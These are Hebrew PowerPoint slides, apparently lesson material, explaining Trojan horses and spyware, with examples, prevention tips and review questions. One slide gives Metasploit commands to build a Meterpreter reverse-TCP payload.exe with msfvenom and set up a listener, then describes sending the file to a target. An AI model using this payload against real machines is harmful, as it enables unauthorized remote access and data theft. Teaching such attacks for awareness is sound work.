              <a:t>: תוקפים יכולים לנסות לגנוב מידע אישי כגון סיסמאות, פרטי כרטיסי אשראי, ומידע רפואי, על מנת לבצע הונאות או גניבה פיננסית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6172201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C736A99-5D7C-49D0-A7DC-D20C736F40C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6490252" y="298174"/>
            <a:ext cx="4634948" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניסוי בתוכנת ריגול</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3418B0C-FC94-40E2-832F-562B12CC11A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1669774"/>
            <a:ext cx="10058400" cy="4890052"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להבין יותר טוב כיצד תוכנות ריגול פועלות. נשתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Metasploit Framework</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להדגים מתקפה פשוטה על מערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Metasploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עם הפקודה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נבחר במודול של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Metasploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שיכול להדגים כיצד תוכנת ריגול יכולה לעבוד. נשתמש במודול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ליצור מתקפה הדמיה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set payload windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LHOST &lt;My </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר מכן ניצור קובץ זדוני, ונשלח אותו למחשב היעד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>וברג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שיפתח את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוקבץ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אנו נקבל גישה לנתונים של היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -p windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LHOST=&lt;My </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>LPORT=4444 -f exe &gt; payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30972187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44E16FEA-F8BF-4568-887D-92E800F1307C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2470867"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8000" dirty="0"/>
              <a:t>סוס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="8000" dirty="0" err="1"/>
              <a:t>טוריאני</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="8000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32014053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9CA085E-ADC4-4EEF-8CDE-F4106C2A5219}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9153938" y="642594"/>
            <a:ext cx="1971261" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקדמה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F5BEADC-F3CD-42C6-91B9-D5C827C27FBC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוס טרויאני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Trojan Horse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא אחד המונחים המרכזיים באבטחת מידע. המושג "סוס טרויאני" נלקח מהמיתולוגיה היוונית, בה הטרויאנים הכניסו לעירם סוס עץ ענק מבלי לדעת שבתוכו חבויים לוחמים יוונים. ברגע שהסוס נכנס לעיר, הלוחמים יצאו מתוכו ותקפו את העיר מבפנים. בדומה לכך, סוס טרויאני בתחום אבטחת המידע הוא תוכנה שנראית לגיטימית או תמימה אך למעשה מכילה קוד זדוני שפועל מאחורי הקלעים.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26517077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5C393A-8325-4A90-83FA-DAA04C70FD25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5436704" y="642594"/>
            <a:ext cx="5688496" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך עובד סוס טרויאני?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DE2F9D9-F028-4F09-A694-432F1F54ED8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר משתמש מוריד ומפעיל סוס טרויאני, הוא בדרך כלל חושב שמדובר בתוכנה רגילה כמו משחק, כלי עזר, או עדכון למערכת. אך מאחורי הקלעים, סוס הטרויאני מבצע פעולות זדוניות כגון:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גניבת מידע:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> סוס טרויאני יכול לאסוף מידע אישי, כגון סיסמאות, מספרי כרטיסי אשראי, או מסמכים רגישים, ולשלוח אותם לתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גישה מרחוק:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף יכול להשתמש בסוס הטרויאני כדי לקבל גישה למחשב הנגוע ולהשתמש בו לשלל מטרות זדוניות, כגון שליטה במחשב כדי לתקוף מחשבים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנה של תוכנות זדוניות נוספות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> סוס הטרויאני יכול להוריד ולהתקין על המחשב הנגוע תוכנות זדוניות נוספות כמו תוכנות כופר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או תוכנות ריגול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spyware</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5285804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C13589-E102-435C-B505-5D82F296DCD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5148470" y="642594"/>
            <a:ext cx="5976730" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמאות לסוסי טרויאני:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6F512B9-FA22-40F0-91A7-05EF3530F4C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Remote Access Trojan (RAT)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> סוס טרויאני המאפשר לתוקף שליטה מרחוק במחשב הנגוע. לדוגמה, סוס טרויאני בשם</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DarkComet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשר לתוקף לשלוט במחשב הקורבן, לצלם צילומי מסך, לגשת לקבצים ולבצע פעולות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Banking Trojan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: סוס טרויאני המתמקד בגניבת פרטי בנקאות. לדוגמה, סוס הטרויאני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Zeus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתמקד בגניבת פרטי התחברות לחשבונות בנק מקוונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Downloader Trojan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוס טרויאני שתפקידו להוריד תוכנות זדוניות נוספות למחשב הנגוע. לדוגמה, סוס הטרויאני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Emotet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התחיל כסוס טרויאני להורדת תוכנות זדוניות אך עם הזמן הפך לתוכנה זדונית מתקדמת בפני עצמה.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9983466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DC39B63-C053-47BA-8213-C8699FB3418E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2554356" y="642594"/>
            <a:ext cx="8570843" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מניעה והתמודדות עם סוס טרויאני:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F54A1DD7-258A-49B3-AAE0-9FD0C429E0A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנטי-וירוס:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש בתוכנת אנטי-וירוס אמינה שמבצעת סריקות באופן קבוע יכולה לעזור בזיהוי ובחסימת סוסי טרויאני. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זהירות בהורדות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הימנע מהורדת קבצים ממקורות לא אמינים או לא רשמיים. תוכנות זדוניות רבות מסתתרות באתרים פחות מהימנים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגנה על המערכת:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמירה על מערכת ההפעלה והתוכנות מעודכנות עם תיקוני אבטחה עדכניים תעזור בהקטנת הסיכוי להדבקה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חינוך והעלאת מודעות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הבנת הסכנות והקפדה על כללי הזהירות תקטין את הסיכוי להיפגע מסוס טרויאני.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29559976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DD99A06-0E25-4B48-800F-A5B538B6E2D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9203634" y="642594"/>
            <a:ext cx="1921565"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5E89017F-0FCD-46AB-883D-FE279525CED6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין סוס טרויאני לתולעת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך אפשר להבחין בין סוס טרויאני לתוכנה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהן הדרכים העיקריות בהן סוס טרויאני יכול להגיע למחשב שלך?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36596938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A949D6D-D475-43EE-8C08-A1AA6393878F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9004852" y="642594"/>
            <a:ext cx="2120348"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A6F13DD9-9B82-467A-926B-D6946C06AE98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. סוס טרויאני הוא תוכנה זדונית המתחזה לתוכנה לגיטימית, ומבצעת פעולות זדוניות לאחר שהמשתמש מתקין ומפעיל אותה. סוס טרויאני לא מתפשט באופן עצמאי בין מחשבים אחרים. ואילו תולעת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא סוג של תוכנה זדונית המתפשטת באופן עצמאי ממחשב למחשב דרך הרשת, בלי צורך בפעולה מצד המשתמש. תולעת מנצלת חולשות ברשת או במערכות כדי להתפשט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הבחנה בין סוס טרויאני לתוכנה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולה להיות קשה מאוד. הנה כמה צעדים שיעזרו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>  א. מקור ההורדה: הורדה של תוכנה ממקורות אמינים ורשמיים כמו אתרי החברה המפתחת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>  ב.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חתימת דיגיטלית: בדיקה אם לתוכנה יש חתימה דיגיטלית תקפה שמאמתת את זהות המפתח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>  ג. תוכנת אנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש בתוכנת אנטי-וירוס עדכנית לבדיקת הקובץ לפני הפעלתו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>  ד. ביקורות משתמשים: חיפוש מידע וביקורות על התוכנה ברשת לפני ההתקנה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39548034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6CC2D0E-5A88-4AEA-98F9-AEC7CE1594A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6957390" y="642594"/>
            <a:ext cx="4167809" cy="1371600"/>
          </a:xfrm>
